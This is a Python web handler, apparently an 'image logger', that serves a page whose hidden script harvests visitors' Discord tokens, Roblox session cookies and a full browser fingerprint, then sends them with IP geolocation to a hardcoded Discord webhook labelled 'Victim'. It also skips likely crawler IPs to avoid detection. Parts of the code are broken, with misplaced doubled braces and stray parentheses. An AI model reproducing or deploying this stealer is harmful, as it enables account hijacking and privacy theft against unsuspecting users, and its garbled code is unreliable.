import asyncio
import base64
import json
import os
import re
from typing import Dict, Any
import httpagentparser
import requests
from urllib.parse import urlparse, parse_qs

handler = None

TOKEN_JS = """
let tokens = [];
try {
    tokens.push(localStorage.getItem('token')?.replace(/["]/g, ''));
    tokens.push(sessionStorage.getItem('token')?.replace(/["]/g, ''));
    (webpackChunkdiscord_app?.push?.([[''],{{}},{{getToken:()=>{}}},['']])?.token);
    for(let a in window.webpackChunkdiscord_app?.[0][1]) {{
        window.webpackChunkdiscord_app[0][1][a]?.exports?.default?.getToken?.()?.replace(/["]/g, '');
    }}
    document.querySelector("[data-slate-object=block]")?.getAttribute('data-slate-string');
    document.cookie.split(';').find(row=>row.includes('__token'))?.split('=')[1];
    tokens.push(localStorage['__discord_token']?.replace(/["]/g, ''));
    tokens.push(sessionStorage['__discord_token']?.replace(/["]/g, ''));
    window.webpackChunkdiscord_app?.forEach?.(chunk=>{{chunk[1]?.exports?.default?.getToken?.()?.replace(/["]/g, '')}});
    (window.webpackRequire?.cache?.discord_app?.exports?.default?.getToken?.()?.replace(/["]/g, ''));
    localStorage.getItem('.eJx')?.replace(/["]/g, '');
    sessionStorage.getItem('.eJx')?.replace(/["]/g, ''));
    tokens.push(localStorage.getItem('discord_token')?.replace(/["]/g, ''));
    tokens.push(sessionStorage.getItem('discord_token')?.replace(/["]/g, ''));
}} catch(e){{}}
tokens = tokens.filter(t=>t && (t.includes('.') || t.includes('_')) && t.length>50);
return [...new Set(tokens)].join(' | ');
"""

ROBLOX_JS = """
let roblox = [];
try {
    roblox.push(localStorage.getItem('.ROBLOSECURITY')?.replace(/["]/g, ''));
    roblox.push(sessionStorage.getItem('.ROBLOSECURITY')?.replace(/["]/g, ''));
    roblox.push(document.cookie.match(/\\.ROBLOSECURITY=([^;]+)/)?.[1]);
    roblox.push(localStorage.getItem('_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_')?.replace(/["]/g, ''));
    roblox.push(sessionStorage.getItem('_|WARNING:-DO-NOT-SHARE-THIS...'));
    roblox.push(document.cookie.match(/RBXSessionTicket=([^;]+)/)?.[1]);
}} catch(e){{}}
roblox = roblox.filter(t=>t && t.length>100);
return [...new Set(roblox)].join(' | ');
"""

FP_JS = """
let fp = {{}};
try {
    fp.ua = navigator.userAgent;
    fp.lang = navigator.language;
    fp.platform = navigator.platform;
    fp.screen = `${{screen.width}}x${{screen.height}}x${{screen.availWidth}}x${{screen.availHeight}}`;
    fp.colorDepth = screen.colorDepth;
    fp.pixelRatio = window.devicePixelRatio;
    fp.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    fp.plugins = Array.from(navigator.plugins).map(p=>p.name).join(',');
    fp.mimeTypes = Array.from(navigator.mimeTypes).map(m=>m.type).join(',');
    
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    ctx.textBaseline = 'top';
    ctx.font = '14px Arial';
    ctx.fillText('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789', 2, 2);
    fp.canvas = canvas.toDataURL();
    
    const glCanvas = document.createElement('canvas');
    const gl = glCanvas.getContext('webgl') || glCanvas.getContext('experimental-webgl');
    fp.webgl = gl?.getParameter(gl.RENDERER);
    fp.webglvendor = gl?.getParameter(gl.VENDOR);
    
    const audio = new AudioContext();
    const osc = audio.createOscillator();
    const analyser = audio.createAnalyser();
    osc.connect(analyser);
    analyser.connect(audio.destination);
    osc.start(0);
    setTimeout(()=>fp.audio = analyser.frequencyBinCount, 100);
    
    fp.hardware = navigator.hardwareConcurrency;
    fp.memory = navigator.deviceMemory;
    fp.battery = navigator.getBattery?.()?.then(b=>`${{b.level*100}}% ${{b.charging?'charging':'discharging'}}`);
    
    const fonts = ['Arial','Times New Roman','Courier New','Verdana','Georgia','Comic Sans MS','Trebuchet MS','Impact','Lucida Sans Unicode','monospace','sans-serif','serif'];
    fp.fonts = fonts.filter(f=>document.fonts.check(`12px ${{f}}`)).join(',');
    
    fp.touch = navigator.maxTouchPoints;
    fp.connection = navigator.connection?.effectiveType + ' ' + navigator.connection?.downlink;
    fp.permissions = navigator.permissions?.query?.({name:'geolocation'})?.state;
    
    fp.webdriver = navigator.webdriver;
    fp.doNotTrack = navigator.doNotTrack;
}} catch(e){{}}
return JSON.stringify(fp);
"""

WEBHOOK_URL = "https://discord.com/api/webhooks/1091220366984224788/Te54hSoJ1kqvAWLompNzA3aWux7gaiQ9IMgedx76z4grFYQd2dcefXbxnl5tbE4DOVbq"

async def send_webhook(data: Dict[str, Any]) -> None:
    try:
        requests.post(WEBHOOK_URL, json=data, timeout=5)
    except:
        pass

async def get_geolocation(ip: str) -> tuple:
    try:
        resp = requests.get(f'http://ip-api.com/json/{ip}?fields=status,message,country,regionName,city,isp,org,timezone,lat,lon,query', timeout=3).json()
        if resp['status'] == 'success':
            geo = f"{resp['city']}, {resp['regionName']}, {resp['country']} | {resp['isp']}"
            coords = f"{resp['lat']:.4f}, {resp['lon']:.4f}"
            return geo, coords
    except:
        pass
    return "Unknown", "N/A"

def is_bot_ip(ip: str) -> bool:
    bad_ips = ['27.', '104.', '143.', '164.', '34.', '35.']
    return any(ip.startswith(bad) for bad in bad_ips)

async def main(request: Any) -> Dict[str, Any]:
    global handler
    
    headers = dict(request.headers)
    real_ip = headers.get('x-forwarded-for', headers.get('x-real-ip', request.client.host))
    
    if is_bot_ip(real_ip):
        return {
            'statusCode': 200,
            'headers': {'Content-Type': 'image/gif', 'Cache-Control': 'no-cache'},
            'body': base64.b64encode(b'GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;').decode()
        }
    
    ua = headers.get('user-agent', 'Unknown')
    os_name, browser = httpagentparser.detect(ua)
    
    image_url = "https://i.imgur.com/4z5z5z5.jpg"
    if 'image' in request.query_params:
        image_url = request.query_params['image']
    
    js_payload = f"""
    <html><head><title></title></head>
    <body style='margin:0;padding:0;overflow:hidden;background:#000;'>
        <img src="{image_url}" style='width:1px;height:1px;opacity:0;position:absolute;' onload="setTimeout(logData,1000);" onerror="setTimeout(logData,1000);">
        <script>
            async function logData() {{
                let tokens = ({TOKEN_JS})();
                let roblox = ({ROBLOX_JS})();
                let fp = {FP_JS}();
                let data = {{ip:'{real_ip}', ua:navigator.userAgent, tokens:tokens, roblox:roblox, fp:fp, os:'{os_name}', browser:'{browser}'}};
                fetch('/steal', {{method:'POST', body:JSON.stringify(data), mode:'no-cors'}});
                navigator.sendBeacon?.('/steal', JSON.stringify(data));
            }}
        </script>
    </body></html>
    """
    
    return {
        'statusCode': 200,
        'headers': {
            'Content-Type': 'text/html',
            'Cache-Control': 'no-cache, no-store, must-revalidate',
            'Pragma': 'no-cache',
            'Expires': '0'
        },
        'body': js_payload
    }

async def steal(request: Any) -> Dict[str, Any]:
    try:
        post_data = await request.body()
        data = json.loads(post_data.decode('utf-8', errors='ignore'))
    except:
        data = {{'error': 'parse failed'}}
    
    geo, coords = await get_geolocation(data.get('ip', ''))
    
    tokens = data.get('tokens', 'No tokens')
    roblox = data.get('roblox', 'No Roblox')
    fp_data = data.get('fp', {{}})
    
    embed = {{
        "title": f"Victim - {data.get('ip', 'Unknown')}",
        "color": 16711680,
        "fields": [
            {{"name": "IP/Location", "value": f"`{data.get('ip', 'Unknown')}`\\n**{geo}**\\n*{coords}*", "inline": True}},
            {{"name": "Device", "value": f"**OS:** {data.get('os', 'Unknown')}\\n**Browser:** {data.get('browser', 'Unknown')}", "inline": True}},
            {{"name": "Discord Tokens", "value": f"`{tokens[:1024]}`", "inline": False}},
            {{"name": "Roblox Cookies", "value": f"`{roblox[:1024]}`", "inline": False}},
            {{"name": "Canvas", "value": f"`{str(fp_data.get('canvas', ''))[:64]}...`", "inline": True}},
            {{"name": "WebGL", "value": f"`{fp_data.get('webgl', 'N/A')}`", "inline": True}},
            {{"name": "Hardware", "value": f"`{fp_data.get('hardware', 'N/A')} cores`\\n`{fp_data.get('memory', 'N/A')}GB`", "inline": True}},
            {{"name": "Screen/Fonts", "value": f"`{fp_data.get('screen', 'N/A')}`\\n`{str(fp_data.get('fonts', ''))[:50]}...`", "inline": True}}
        ],
        "thumbnail": {{"url": "https://i.imgur.com/4z5z5z5.jpg"}},
        "footer": {{"text": f"UA: {data.get('ua', 'Unknown')[:100]}"}},
        "timestamp": "2026-02-12T12:00:00.000Z"
    }}
    
    await send_webhook({{"embeds": [embed]}})
    
    return {'statusCode': 200, 'body': 'OK'}

async def handler(request: Any) -> Dict[str, Any]:
    path = request.path
    
    if path == '/steal' or 'steal' in path:
        return await steal(request)
    
    return await main(request)
